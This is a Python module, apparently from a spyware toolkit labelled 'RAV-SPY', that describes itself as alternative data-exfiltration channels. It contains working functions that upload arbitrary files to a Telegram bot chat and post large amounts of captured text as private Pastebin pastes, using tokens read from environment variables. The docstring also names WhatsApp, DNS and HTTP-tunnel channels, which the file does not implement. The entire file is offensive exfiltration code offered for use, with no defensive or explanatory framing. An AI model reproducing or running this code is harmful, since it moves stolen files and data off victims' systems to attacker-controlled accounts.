"""
Exfiltration Channels — alternative methods to exfiltrate data.
Channels: Telegram, WhatsApp, DNS, HTTP tunnel, Pastebin.
"""
import os
import base64
import asyncio
from loguru import logger


async def via_telegram(file_path: str, caption: str = "") -> str:
    """Send file via Telegram bot API directly from agent."""
    token = os.environ.get("TELEGRAM_BOT_TOKEN", "")
    chat_id = os.environ.get("ALLOWED_USER_IDS", "").split(",")[0] if os.environ.get("ALLOWED_USER_IDS") else ""

    if not token or not chat_id:
        return "Telegram not configured."

    import httpx
    try:
        async with httpx.AsyncClient(timeout=60) as client:
            with open(file_path, "rb") as f:
                files = {"document": (os.path.basename(file_path), f, "application/octet-stream")}
                resp = await client.post(
                    f"https://api.telegram.org/bot{token}/sendDocument",
                    data={"chat_id": chat_id, "caption": caption[:200]},
                    files=files,
                )
                if resp.status_code == 200:
                    return f"Sent via Telegram: {os.path.basename(file_path)}"
                return f"Telegram send failed: {resp.status_code}"
    except Exception as e:
        return f"Telegram error: {e}"


async def via_pastebin(content: str, title: str = "RAV-SPY Data") -> str:
    """Upload text content to Pastebin."""
    api_key = os.environ.get("PASTEBIN_API_KEY", "")
    if not api_key:
        return "Pastebin not configured (PASTEBIN_API_KEY)."

    import httpx
    try:
        async with httpx.AsyncClient(timeout=30) as client:
            resp = await client.post("https://pastebin.com/api/api_post.php", data={
                "api_dev_key": api_key,
                "api_option": "paste",
                "api_paste_code": content[:500000],
                "api_paste_name": title[:100],
                "api_paste_private": "2",
            })
            if resp.status_code == 200 and resp.text.startswith("https://"):
                return f"Pastebin: {resp.text}"
            return f"Pastebin failed: {resp.text[:100]}"
    except Exception as e:
        return f"Pastebin error: {e}"
